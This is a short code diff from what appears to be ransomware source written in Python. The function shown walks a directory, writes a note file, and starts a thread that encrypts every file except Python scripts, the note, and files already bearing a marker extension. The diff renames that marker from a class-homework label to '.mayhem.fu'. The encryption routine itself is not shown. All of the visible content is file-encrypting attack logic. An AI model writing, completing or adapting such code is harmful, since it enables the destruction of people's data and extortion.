@@ -24,7 +24,7 @@ def parse_dir(root, folder):
                 q.write(msg)
         for file in os.listdir(f"{root}/{folder}"):
             if not file.endswith('.py') and not file.endswith('.note.txt') and not file.endswith(
-                    '.ThisIsClassHomeworks'):
+                    '.mayhem.fu'):
                 threading.Thread(target=encrypt, args=(root, folder, file)).start()
         return 0
     except Exception as e:
